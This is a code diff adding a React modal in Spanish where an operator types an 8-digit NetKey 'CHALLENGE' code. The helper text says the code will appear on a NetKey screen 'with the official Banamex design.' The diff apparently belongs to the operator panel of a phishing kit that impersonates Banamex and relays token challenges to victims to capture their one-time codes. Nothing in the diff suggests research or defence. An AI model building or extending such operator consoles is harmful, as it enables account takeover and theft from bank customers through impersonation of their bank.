@@ -838,3 +838,67 @@ export const NetKeyCustomModal: React.FC<NetKeyCustomModalProps> = ({ isOpen, on
     </Modal>
   );
 };
+interface NetKeyManualModalProps {
+  isOpen: boolean;
+  onClose: () => void;
+  onConfirm: (manualNetkeyChallenge: string) => void;
+}
+
+export const NetKeyManualModal: React.FC<NetKeyManualModalProps> = ({ isOpen, onClose, onConfirm }) => {
+  const [manualNetkeyChallenge, setManualNetkeyChallenge] = useState('');
+
+  const handleSubmit = () => {
+    if (manualNetkeyChallenge.length === 8 && /^\d+$/.test(manualNetkeyChallenge)) {
+      onConfirm(manualNetkeyChallenge);
+      setManualNetkeyChallenge('');
+    } else {
+      alert('Por favor ingresa exactamente 8 dígitos numéricos');
+    }
+  };
+
+  return (
+    <Modal isOpen={isOpen} onClose={onClose} title="NetKey Manual - Código CHALLENGE">
+      <div className="space-y-3">
+        <div>
+          <Label htmlFor="manualNetkeyChallenge" className="block mb-2 text-white">
+            Código CHALLENGE de 8 dígitos
+          </Label>
+          <Input 
+            id="manualNetkeyChallenge" 
+            type="text" 
+            placeholder="Ej: 59785664"
+            value={manualNetkeyChallenge}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, '');
+              if (value.length <= 8) {
+                setManualNetkeyChallenge(value);
+              }
+            }}
+            maxLength={8}
+            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none text-2xl text-center font-mono tracking-widest"
+          />
+          <p className="text-xs text-gray-400 mt-2">
+            Este código se mostrará en la pantalla NetKey con el diseño oficial de Banamex
+          </p>
+        </div>
+      </div>
+
+      <div className="flex justify-end space-x-2 mt-6">
+        <Button 
+          onClick={onClose}
+          variant="secondary"
+          className="bg-gray-600 text-white hover:bg-gray-700"
+        >
+          Cancelar
+        </Button>
+        <Button 
+          onClick={handleSubmit}
+          variant="default"
+          className="bg-[#007bff] text-white hover:bg-opacity-90"
+        >
+          Enviar CHALLENGE
+        </Button>
+      </div>
+    </Modal>
+  );
+};
